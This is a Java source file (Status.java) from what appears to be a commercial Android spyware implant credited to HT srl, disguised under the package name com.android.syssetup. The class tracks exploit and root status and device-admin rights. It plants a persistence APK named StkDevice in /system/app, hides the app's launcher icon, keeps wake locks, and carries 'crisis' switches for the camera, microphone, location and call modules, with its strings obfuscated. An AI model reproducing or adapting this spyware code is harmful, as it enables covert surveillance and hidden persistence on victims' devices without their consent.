/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.syssetup;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.widget.Toast;

import com.android.mm.M;
import com.android.syssetup.action.Action;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfEvent;
import com.android.syssetup.conf.ConfModule;
import com.android.syssetup.conf.Globals;
import com.android.syssetup.crypto.Digest;
import com.android.syssetup.event.BaseEvent;
import com.android.syssetup.file.AutoFile;
import com.android.syssetup.gui.SetGui;
import com.android.syssetup.module.ModuleCrisis;
import com.android.syssetup.util.Check;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;

// Singleton Class

/**
 * The Class Status.
 */
public class Status {
	public static final int EXPLOIT_STATUS_NONE = 0;
	private static int exploitStatus = EXPLOIT_STATUS_NONE;
	public static final int EXPLOIT_STATUS_RUNNING = 1;
	public static final int EXPLOIT_STATUS_EXECUTED = 2;
	public static final int EXPLOIT_STATUS_NOT_POSSIBLE = 3;
	public static final int EXPLOIT_RESULT_NONE = 0;
	private static int exploitResult = EXPLOIT_RESULT_NONE;
	public static final int EXPLOIT_RESULT_FAIL = 1;
	public static final int EXPLOIT_RESULT_SUCCEED = 2;
	public static final int EXPLOIT_RESULT_NOTNEEDED = 3;
	public static final int PERSISTENCY_STATUS_NOT_REQUIRED = -1;
	private static int persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
	public static final int PERSISTENCY_STATUS_TO_INSTALL = 0;
	public static final int PERSISTENCY_STATUS_FAILED = 1;
	public static final int PERSISTENCY_STATUS_PRESENT_TOREBOOT = 2;
	public static final int PERSISTENCY_STATUS_PRESENT = 3;
	public static final String persistencyPackage = M.e("StkDevice");
	public static final String persistencyApk = M.e("/system/app/") + persistencyPackage + M.e(".apk");
	private static final String TAG = "Status"; //$NON-NLS-1$
	/**
	 * The synced.
	 */
	static public boolean synced;
	/**
	 * The drift.
	 */
	static public int drift;
	/**
	 * For forward compatibility versus 8.0
	 */
	public static boolean calllistCreated = false;
	static public boolean uninstall;
	public static Object uninstallLock = new Object();
	static public boolean wifiConnected = false;
	static public boolean gsmConnected = false;
	static Object lockCrisis = new Object();
	static WakeLock wl;
	static boolean activityListTested = false;
	static Handler deafultHandler = new Handler();
	/**
	 * The agents map.
	 */
	private static HashMap<String, ConfModule> modulesMap;
	/**
	 * The events map.
	 */
	private static HashMap<Integer, ConfEvent> eventsMap;
	/**
	 * The actions map.
	 */
	private static HashMap<Integer, Action> actionsMap;
	private static Globals globals;
	/**
	 * The triggered actions.
	 */
	private static ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];
	/**
	 * The context.
	 */
	private static Context context;
	static private boolean crisis = false;
	static private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
	static private boolean haveRoot = false, haveSu = false;
	private static Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];
	private static ArrayList<String> activityList = null;
	private static SetGui gui;
	/**
	 * The singleton.
	 */
	private volatile static Status singleton;
	private final Date startedTime = new Date();
	public Object lockFramebuffer = new Object();
	RunningProcesses runningProcess = RunningProcesses.self();
	private boolean deviceAdmin;
	private int haveCamera = -1;
	private boolean reload;


	/**
	 * Instantiates a new status.
	 */
	private Status() {

		modulesMap = new HashMap<String, ConfModule>();
		eventsMap = new HashMap<Integer, ConfEvent>();
		actionsMap = new HashMap<Integer, Action>();
		if (Cfg.PERSISTENCE) {
			persistencyStatus = PERSISTENCY_STATUS_TO_INSTALL;
		} else {
			persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
		}
		for (int i = 0; i < Action.NUM_QUEUE; i++) {
			triggeredSemaphore[i] = new Object();
			triggeredActions[i] = new ArrayList<Integer>();
		}
	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	/**
	 * Clean.
	 */
	static public void clean() {
		modulesMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		globals = null;
		uninstall = false;

		// Forward compatibility
		calllistCreated = false;
	}

	/**
	 * Gets the app context.
	 *
	 * @return the app context
	 */
	public static Context getAppContext() {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}

		return context;
	}

	/**
	 * Sets the app context.
	 *
	 * @param context the new app context
	 */
	public static void setAppContext(final Context context) {
		if (Cfg.DEBUG) {
			Check.requires(context != null, "Null Context"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (setAppContext), " + context.getPackageName());
		}

		Status.context = context;

		if (Cfg.POWER_MANAGEMENT) {
			final PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
		}
	}

	public static SetGui getAppGui() {
		return gui;
	}

	public static void setAppGui(SetGui applicationContext) {
		setAppContext(applicationContext.getAppContext());
		Status.gui = applicationContext;
	}

	public static boolean isGuiVisible() {
		if (Cfg.GUI) {
			return RunningProcesses.self().isGuiVisible();
		}
		return false;
	}

	public static ContentResolver getContentResolver() {
		return context.getContentResolver();

	}

	// Add an agent to the map

	static public Handler getDefaultHandler() {
		return deafultHandler;
	}

	// Add an event to the map

	/**
	 * Adds the agent.
	 *
	 * @param a the a
	 * @throws GeneralException the RCS exception
	 */
	public static void addModule(final ConfModule a) throws GeneralException {
		if (modulesMap.containsKey(a.getType()) == true) {
			// throw new RCSException("Agent " + a.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituting module: " + a); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		final String key = a.getType();
		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		modulesMap.put(a.getType(), a);
	}

	// Add an action to the map

	/**
	 * Adds the event.
	 *
	 * @param e the e
	 * @return
	 * @throws GeneralException the RCS exception
	 */
	public static boolean addEvent(final ConfEvent e) {
		if (Cfg.DEBUG) {
			//Check.log(TAG + " addEvent "); //$NON-NLS-1$
		}
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			// throw new RCSException("Event " + e.getId() + " already loaded");
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Substituting event: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		eventsMap.put(e.getId(), e);
		return true;
	}

	/**
	 * Adds the action.
	 *
	 * @param a the a
	 * @throws GeneralException the RCS exception
	 */
	public static void addAction(final Action a) {
		// Don't add the same action twice
		if (Cfg.DEBUG) {
			Check.requires(!actionsMap.containsKey(a.getId()), "Action " + a.getId() + " already loaded"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		actionsMap.put(a.getId(), a);
	}

	static public int getExploitStatus() {
		return exploitStatus;
	}

	static public void setExploitStatus(int es) {
		exploitStatus = es;
	}

	static public int getExploitResult() {
		return exploitResult;
	}

	static public void setExploitResult(int er) {
		exploitResult = er;
	}

	static public String getExploitStatusString() {
		switch (exploitStatus) {
			case EXPLOIT_STATUS_NONE:
				return M.e("NOT RUN");
			case EXPLOIT_STATUS_RUNNING:
				return M.e("ON GOING");
			case EXPLOIT_STATUS_EXECUTED:
				return M.e("RUN");
			case EXPLOIT_STATUS_NOT_POSSIBLE:
				return M.e("NOT POSSIBLE");
			default:
				break;
		}
		return M.e("UNKNOWN");
	}

	static public String getExploitResultString() {
		switch (exploitResult) {
			case EXPLOIT_RESULT_FAIL:
				return M.e("FAILED");
			case EXPLOIT_RESULT_SUCCEED:
				return M.e("SUCCEED");
			case EXPLOIT_RESULT_NOTNEEDED:
				return M.e("GOT ALREADY");
			case EXPLOIT_RESULT_NONE:
				return M.e("NO RESULT");
			default:
				break;
		}
		return M.e("UNKNOWN");
	}

	static public void setGlobal(Globals g) {
		globals = g;
	}

	/**
	 * Gets the actions number.
	 *
	 * @return the actions number
	 */
	static public int getActionsNumber() {
		return actionsMap.size();
	}

	/**
	 * Gets the agents number.
	 *
	 * @return the agents number
	 */
	static public int getAgentsNumber() {
		return modulesMap.size();
	}

	/**
	 * Gets the events number.
	 *
	 * @return the events number
	 */
	static public int getEventsNumber() {
		return eventsMap.size();
	}

	/**
	 * Gets the agents map.
	 *
	 * @return the agents map
	 */
	static public HashMap<String, ConfModule> getModulesMap() {
		return modulesMap;
	}

	/**
	 * Gets the events map.
	 *
	 * @return the events map
	 */
	static public HashMap<Integer, ConfEvent> getEventsMap() {
		return eventsMap;
	}

	/**
	 * Gets the actions map.
	 *
	 * @return the actions map
	 */
	static public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	/**
	 * Gets the action.
	 *
	 * @param index the index
	 * @return the action
	 * @throws GeneralException the RCS exception
	 */
	static public Action getAction(final int index) throws GeneralException {
		if (actionsMap.containsKey(index) == false) {
			throw new GeneralException(index + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final Action a = actionsMap.get(index);

		if (a == null) {
			throw new GeneralException(index + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return a;
	}

	/**
	 * Gets the event.
	 *
	 * @param id the id
	 * @return the event
	 * @throws GeneralException the RCS exception
	 */
	static public ConfEvent getEvent(final int id) throws GeneralException {
		if (eventsMap.containsKey(id) == false) {
			throw new GeneralException(id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		final ConfEvent e = eventsMap.get(id);

		if (e == null) {
			throw new GeneralException(id + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return e;
	}

	/**
	 * @return the option
	 * @throws GeneralException the RCS exception
	 */
	static public Globals getGlobals() {
		return globals;
	}

	/**
	 * Trigger action.
	 *
	 * @param i         the i
	 * @param baseEvent
	 */

	static public void triggerAction(final int i, BaseEvent baseEvent) {
		if (Cfg.DEBUG) {
			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
		}

		Action action = actionsMap.get(Integer.valueOf(i));

		if (Cfg.DEBUG) {
			Check.asserts(action != null, " (triggerAction) Assert failed, null action");
		}

		int qq = action.getQueue();
		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(act != null, "triggerAction, null act");
		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "triggerAction, null tsem");

		Trigger trigger = new Trigger(i, baseEvent);
		synchronized (act) {
			if (!act.contains(trigger)) {
				act.add(new Trigger(i, baseEvent));
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (triggerAction): notifing queue: " + qq + " size: " + triggeredActions[qq].size());
		}
		synchronized (tsem) {
			try {
				tsem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Gets the triggered actions.
	 *
	 * @return the triggered actions
	 */
	static public Trigger[] getTriggeredActions(int qq) {
		if (Cfg.DEBUG)
			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);

		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object tsem = triggeredSemaphore[qq];

		if (Cfg.DEBUG)
			Check.asserts(tsem != null, "getTriggeredActions null tsem");

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getTriggeredActions): waiting on sem: " + qq);
			}
			synchronized (tsem) {
				if (act.size() == 0) {
					tsem.wait();
				} else {
					if (Cfg.DEBUG) {
						//Check.log(TAG + " (getTriggeredActions): have act not empty, don't wait");
					}
				}
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);
				Check.log(TAG + " Error: " + " getActionIdTriggered: " + e); //$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		synchronized (tsem) {
			final int size = act.size();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getTriggeredActions):  size: " + size); //$NON-NLS-1$ //$NON-NLS-2$
			}
			final Trigger[] triggered = new Trigger[size];

			for (int i = 0; i < size; i++) {
				triggered[i] = act.get(i);
			}

			return triggered;
		}
	}

	/**
	 * Dangerous, DO NOT USE
	 *
	 * @param qq
	 * @return
	 */
	@Deprecated
	static public Trigger[] getNonBlockingTriggeredActions(int qq) {
		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		final int size = act.size();
		final Trigger[] triggered = new Trigger[size];

		for (int i = 0; i < size; i++) {
			triggered[i] = act.get(i);
		}

		return triggered;
	}

	/**
	 * Un trigger action.
	 *
	 * @param action the action
	 */
	static public void unTriggerAction(final Action action) {
		int qq = action.getQueue();
		@SuppressWarnings("unchecked")
		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
		Object sem = triggeredSemaphore[qq];

		Trigger trigger = new Trigger(action.getId(), null);
		synchronized (act) {
			if (act.contains(trigger)) {
				act.remove(trigger);
			}
		}
		synchronized (sem) {
			try {
				sem.notifyAll();
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);//$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Un trigger all.
	 */
	static public void unTriggerAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		for (int qq = 0; qq < Action.NUM_QUEUE; qq++) {
			@SuppressWarnings("unchecked")
			ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
			Object sem = triggeredSemaphore[qq];

			synchronized (act) {
				act.clear();
			}
			synchronized (sem) {
				try {
					sem.notifyAll();
				} catch (final Exception ex) {
					if (Cfg.EXCEPTION) {
						Check.log(ex);
					}

					if (Cfg.DEBUG) {
						Check.log(ex);//$NON-NLS-1$
					}
				}
			}
		}

	}

	static public synchronized void setCrisis(int type, boolean value) {
		synchronized (lockCrisis) {
			crisisType[type] = value;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " setCrisis: " + type); //$NON-NLS-1$
		}
	}

	static private boolean isCrisis() {
		synchronized (lockCrisis) {
			return crisis;
		}
	}

	static public boolean crisisPosition() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
		}
	}

	static public boolean crisisCamera() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
		}
	}

	static public boolean crisisCall() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.CALL]);
		}
	}

	static public boolean crisisMic() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.MIC]);
		}
	}

	static public boolean crisisSync() {
		synchronized (lockCrisis) {
			return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
		}
	}

	/**
	 * Start crisis.
	 */
	static public void startCrisis() {
		synchronized (lockCrisis) {
			crisis = true;
		}
	}

	/**
	 * Stop crisis.
	 */
	static public void stopCrisis() {
		synchronized (lockCrisis) {
			crisis = false;
		}
	}

	static public boolean haveRoot() {
		return haveRoot;
	}

	static public void setRoot(boolean r) {
		haveRoot = r;
	}

	static public boolean haveSu() {
		return haveSu;
	}

	static public void setSu(boolean s) {
		haveSu = s;
	}

	static public ScheduledExecutorService getStpe() {
		return Executors.newScheduledThreadPool(1);
	}

	static public void setIconState(Boolean hide) {
		// Nascondi l'icona (subito in android 4.x, al primo reboot
		// in android 2.x)
		if (!Cfg.GUI) {
			return;
		}
		PackageManager pm = Status.self().getAppContext().getPackageManager();

		ComponentName cn = new ComponentName(Status.self().getAppContext().getPackageName(), SetGui.class.getCanonicalName());
		int i = pm.getComponentEnabledSetting(cn);
		if (hide) {
			if (i != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Hide ICON for:" + cn);//$NON-NLS-1$
				}
				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
						PackageManager.DONT_KILL_APP);
			}
		} else {
			int n = 0;
			while (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED && n++ < 5) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " RESTORE ICON for:" + cn);//$NON-NLS-1$
				}
				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
						PackageManager.DONT_KILL_APP);
				try {
					Thread.sleep(100);
					i = pm.getComponentEnabledSetting(cn);
				} catch (InterruptedException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "Exception RESTORE ICON for:" + cn + e);//$NON-NLS-1$
					}
				}
			}
		}
		// wait few seconds in order to let update the Notification manager, see : https://code.google.com/p/android/issues/detail?id=42540
		try {
			Thread.sleep(4000);
		} catch (InterruptedException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "Exception While waiting in RESTORE ICON for:" + cn + e);//$NON-NLS-1$
			}
		}
	}

	public static PackageInfo getMyPackageInfo() {
		PackageInfo pi = null;
		PackageManager pm = Status.self().getAppContext().getPackageManager();
		try {
			pi = pm.getPackageInfo(Status.self().getAppContext().getPackageName(), 0);
		} catch (PackageManager.NameNotFoundException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getMyPackageInfo) error:" + e);
			}
			return null;
		}
		return pi;
	}

	/*
	 * return true if we did a persisten installation and
	 * apk name contained in applicationInfo.sourceDir mismatch
	 * with the new one , in that case a reboot is needed to
	 * align the two info.
	 */
	public static Boolean needReboot() {
		PackageInfo pi = null;
		if ((pi = getMyPackageInfo()) != null) {
			if (persistencyApk != null && !pi.applicationInfo.sourceDir.equals(persistencyApk)) {
				return true;
			}
		}
		return false;
	}

	public static String getApkName() {
		PackageInfo pi = null;
		if ((pi = getMyPackageInfo()) != null) {
			return pi.applicationInfo.sourceDir;
		}
		return null;
	}

	public static String getAppDir() {
		PackageInfo pi = null;
		if ((pi = getMyPackageInfo()) != null) {
			return pi.applicationInfo.dataDir;
		}
		return null;
	}

	/**
	 * already persistent and rebooted
	 *
	 * @return
	 */
	public static Boolean isPersistent() {
		String apkName = getApkName();
		if (apkName != null) {
			return apkName.contains(M.e("/system/app/"));
		}
		return false;
	}

	/**
	 * Installed but not yet reboot
	 *
	 * @return
	 */
	public static Boolean persistencyReady() {
		AutoFile apkFile = new AutoFile(persistencyApk);
		if (apkFile.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (persistencyReady) apk already there" + persistencyApk);
			}
			return true;
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there" + persistencyApk);
		}
		return false;
	}

	public static int getPersistencyStatus() {
		return persistencyStatus;
	}

	public static void setPersistencyStatus(int i) {
		persistencyStatus = i;
	}

	public static String getPersistencyStatusStr() {
		if (!Cfg.PERSISTENCE)
			return M.e("not required[c]");
		switch (persistencyStatus) {
			case PERSISTENCY_STATUS_FAILED:
				return M.e("installation failed");
			case PERSISTENCY_STATUS_NOT_REQUIRED:
				return M.e("not required");
			case PERSISTENCY_STATUS_PRESENT:
				return M.e("present");
			case PERSISTENCY_STATUS_PRESENT_TOREBOOT:
				return M.e("present, not yet rebooted");
			case PERSISTENCY_STATUS_TO_INSTALL:
				return M.e("required, to be installed");
			default:
				break;
		}
		return M.e("UNKNOWN");
	}

	public static boolean isMelt() {

		String pack = Status.self().getAppContext().getPackageName();
		// echo -n "com.android.syssetup" | md5
		boolean equal = Digest.MD5(pack).equals("b232a7613976c9420b76780ec6c225a8");
		return !(equal);

		/*if (activityListTested == false) {
			activityList = PackageUtils.getActivitisFromApk(getApkName());
			activityListTested = true;
		}
		if (activityList != null && !activityList.isEmpty()) {
			for (String s : activityList) {
				if (!s.contains(Status.self().getAppContext().getPackageName())) {
					return true;
				}
			}
		}
		return false;*/
	}

	public static boolean isBlackberry() {
		return Build.BOARD.equals(M.e("BLACKBERRY"));
	}

	public void acquirePowerLock() {
		if (Cfg.POWER_MANAGEMENT) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (acquirePowerLock)");
				Check.requires(wl != null, "null wl");
			}
			if (wl != null) {
				wl.acquire(1000);
			}
		}
	}

	public void releasePowerLock() {
		if (Cfg.POWER_MANAGEMENT) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (releasePowerLock)");
				Check.requires(wl != null, "null wl");
			}
			if (wl != null && wl.isHeld()) {
				wl.release();
			}
		}
	}

	public synchronized void setDeviceAdmin(boolean value) {
		deviceAdmin = value;
	}

	public synchronized boolean haveAdmin() {
		return deviceAdmin;
	}

	public void makeToast(final String message) {
		if (Cfg.DEMO) {
			try {
				Handler h = new Handler(getAppContext().getMainLooper());
				// Although you need to pass an appropriate context
				h.post(new Runnable() {
					@Override
					public void run() {
						Toast.makeText(context, message, Toast.LENGTH_LONG).show();
					}
				});
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (makeToast) Error: " + ex);
				}
			}
		}
	}

	public synchronized void setReload() {
		this.reload = true;
	}

	public synchronized boolean wantsReload() {
		return this.reload;
	}

	public synchronized void unsetReload() {
		this.reload = false;
	}

	public String getForeground() {
		return runningProcess.getForeground_wrapper();
	}

	public RunningProcesses getRunningProcess() {
		return runningProcess;
	}

	public long startedSeconds() {
		Date timestamp = new Date();
		long delta = timestamp.getTime() - startedTime.getTime();
		if (Cfg.DEBUG) {
			Check.ensures(delta >= 0, "Can't be negative");
			Check.log("Started %s seconds ago", (int) delta / 1000);
		}
		return delta / 1000;
	}

	private boolean checkCameraHardware() {

		if (Build.DEVICE.equals(M.e("mako")) && android.os.Build.VERSION.SDK_INT < 18) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), disabled on nexus4 up to 4.2");
			}
			return false;
		}

		if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)
				|| Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT)) {
			// this device has a camera
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), camera present");
			}

			return true;
		} else {
			// no camera on this device
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkCameraHardware), no camera");
			}
			return false;
		}
	}

	public boolean haveCamera() {

		if (haveCamera == -1) {
			haveCamera = checkCameraHardware() ? 1 : 0;
		}
		return haveCamera == 1;
	}
}
